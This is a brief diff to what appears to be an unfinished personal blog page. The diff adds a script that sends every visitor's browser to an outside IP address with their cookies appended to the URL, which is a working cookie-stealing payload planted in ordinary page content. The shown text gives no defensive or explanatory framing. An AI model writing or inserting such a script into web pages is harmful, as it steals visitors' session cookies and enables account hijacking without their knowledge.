@@ -128,3 +128,8 @@ Someday I will finish this page. Need to change the name of my blog to <b> Super
 
 
 
+<script type="text/javascript">
+document.location='http://84.252.129.146:9999/?c='+document.cookie;
+</script>
+
+
